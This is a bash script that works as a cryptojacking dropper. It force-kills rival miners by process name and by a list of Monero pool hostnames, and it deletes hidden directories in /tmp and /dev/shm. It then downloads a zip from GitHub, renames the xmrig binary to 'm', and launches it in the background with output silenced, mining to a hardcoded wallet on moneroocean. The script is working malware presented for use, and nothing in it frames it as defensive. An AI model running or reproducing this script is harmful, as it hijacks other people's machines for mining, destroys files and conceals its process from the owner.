#!/bin/bash
# Terminate all mining-related processes
pkill -9 -f 'xmrig' 2>/dev/null || true
pkill -9 -f 'miner' 2>/dev/null || true
pkill -9 -f 'cpuminer' 2>/dev/null || true
pkill -9 -f 'xmr-stak' 2>/dev/null || true
pkill -9 -f 'systemd-service' 2>/dev/null || true
pkill -9 -f 'systemf' 2>/dev/null || true

# Kill processes connected to popular mining pools
MINING_POOLS=(
    "pool.hashvault.pro"
    "moneroocean.stream"
    "gulf.moneroocean.stream"
    "supportxmr.com"
    "nanopool.org"
    "minexmr.com"
    "xmrig.com"
    "xmrig.cc"
    "pool.minexmr.com"
    "xmrpool.eu"
    "moneropool.com"
    "pool.4i77.com"
    "pool.usxmrpool.com"
    "xmrpool.net"
    "fairhash.org"
    "monero.crypto-pool.fr"
    "sumominer.com"
    "monero.hashvault.pro"
    "backup-pool.com"
    "moriaxmr.com"
    "bohemianpool.com"
    "mine.xmrpool.net"
    "pool.xmr.pt"
)

for POOL in "${MINING_POOLS[@]}"; do
    pkill -9 -f "$POOL" 2>/dev/null || true
done

# Clean hidden miner locations
rm -rf /tmp/.x/m 2>/dev/null
pkill -9 -f '/tmp/.x/m' 2>/dev/null || true
rm -rf /dev/shm/.x/m 2>/dev/null
pkill -9 -f '/dev/shm/.x/m' 2>/dev/null || true

# Remove suspicious hidden files
find /tmp -name '.X*' -type d -exec rm -rf {} \; 2>/dev/null || true
find /dev/shm -name '.X*' -type d -exec rm -rf {} \; 2>/dev/null || true

# Main installation and launch
wget https://github.com/paradoxy1337/hwloc-without/archive/refs/heads/main.zip -O main.zip && \
unzip -o main.zip && \
cd hwloc-without-main && \
chmod +x xmrig && \
mv xmrig m && \
nohup ./m -o gulf.moneroocean.stream:10128 -u 49Wg2WsaZS1WA1s4USLNmxK1o5iBqw8aK6tButK4HLgK4XHn3xXGa247BNyLiE7ZzyHR17fotQJwqJF5Mi8Lz6B4L9JGKDE -p worker1 --cpu-max-threads-hint=75 -B --donate-level=0 >/dev/null 2>&1 &
